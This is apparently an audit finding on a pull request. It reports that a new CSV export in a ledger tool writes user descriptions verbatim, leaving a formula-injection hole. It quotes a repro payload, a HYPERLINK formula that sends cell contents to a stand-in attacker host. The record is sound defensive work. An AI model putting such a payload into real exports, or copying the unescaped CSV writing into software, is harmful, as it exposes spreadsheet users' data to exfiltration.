candidates.basis: ledger/export.py is a wholly new file in this head commit (base commit 2301c83 has no export.py and cli.py had no --format/CSV path at all), and its statement_csv writes each entry's user-supplied description verbatim into a CSV cell via csv.writer with no neutralization of leading =, +, -, @, tab, or CR; Ledger.post (ledger/accounts.py) accepts descriptions as unrestricted strings, and a direct repro confirms a description of '=HYPERLINK("http://attacker.example/?"&A1,"x")' is emitted unmodified into the exported CSV, which the PR body identifies accountants as opening in a spreadsheet.

evidence.text: accountants want to open them in a spreadsheet

safety_rulings.conditions: description begins with a formula-trigger character such as '='
safety_rulings.premise: csv.writer neutralizes or blocks formula-trigger leading characters before writing a field

evidence.text: "=HYPERLINK(""http://attacker.example/?""&A1,""x"")" written verbatim, only comma/quote-escaped, leading '=' intact
